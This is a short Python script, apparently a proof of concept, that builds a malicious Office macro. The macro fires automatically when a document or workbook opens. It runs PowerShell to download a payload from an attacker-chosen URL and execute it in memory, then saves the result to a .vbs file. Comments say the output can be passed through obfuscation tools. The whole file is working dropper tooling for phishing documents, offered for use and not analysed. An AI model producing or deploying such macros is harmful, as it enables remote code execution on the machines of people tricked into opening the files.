# /usr/bin/python3 env
# A simpe Macro Generator
# Simple POC, this can be used with other tools to obfuscate
# Will Bypass nothing

print ("""
  __  __                             _____                           _             
 |  \/  |                           / ____|                         | |            
 | \  / | __ _  ___ _ __ ___ ______| |  __  ___ _ __   ___ _ __ __ _| |_ ___  _ __ 
 | |\/| |/ _` |/ __| '__/ _ \______| | |_ |/ _ \ '_ \ / _ \ '__/ _` | __/ _ \| '__|
 | |  | | (_| | (__| | | (_) |     | |__| |  __/ | | |  __/ | | (_| | || (_) | |   
 |_|  |_|\__,_|\___|_|  \___/       \_____|\___|_| |_|\___|_|  \__,_|\__\___/|_|   
                                                                                   
                                                                                   
""")

macro_name = input ("Choose File name >>")
print ("Example: http://example:80/Payload.ps1")
url = input ("Enter Full URL payload with PS Filename included >>")

macro_payload = macro_name + '.vbs'
macro = "Sub Auto_Open()\n"
macro += "   Dim exec As String\n"
macro += "   Dim payload As String\n"
macro += """   exec = "powershell.exe ""IEX ((New-Object Net.WebClient).DownloadString"""
macro += "('"
macro += str(url)
macro += "'))\"\"\"\n"
macro += "   Shell (exec)\n"
macro += "End Sub\n"
macro += "Sub AutoOpen()\n"
macro += "    Auto_Open\n"
macro += "End Sub\n"
macro += "Sub Workbook_Open()\n"
macro += "   Auto_Open\n"
macro += "End Sub\n"

macrof = open(macro_payload, 'w')
macrof.write(macro)
macrof.close()

print ("File saved as: " + macro_name)
